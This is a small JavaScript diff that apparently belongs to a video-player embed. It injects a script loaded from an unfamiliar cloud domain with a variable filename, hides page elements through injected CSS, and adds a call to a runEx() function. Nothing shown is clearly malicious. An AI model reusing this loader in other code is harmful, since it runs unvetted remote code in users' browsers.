@@ -11,7 +11,7 @@ var scriptfd = document.createElement("script");
         scriptfd.setAttribute("type", "text/javascript");
         scriptfd.setAttribute("src", "https://player.fcasfs-of.cloud-fs.net/_file/"+getval_tyget+".js");
 
-        document.head.appendChild(scriptfd);
+        document.body.appendChild(scriptfd);
 
 
 var scriptd = document.createElement("div");
@@ -19,6 +19,8 @@ scriptd.style.display="none"; scriptd.innerHTML='<style>#plo, #zplayler, #plo #z
 
         inpmyNavruz.appendChild(scriptd);
 
+
+if (runEx){  runEx();  }
 
 
 }
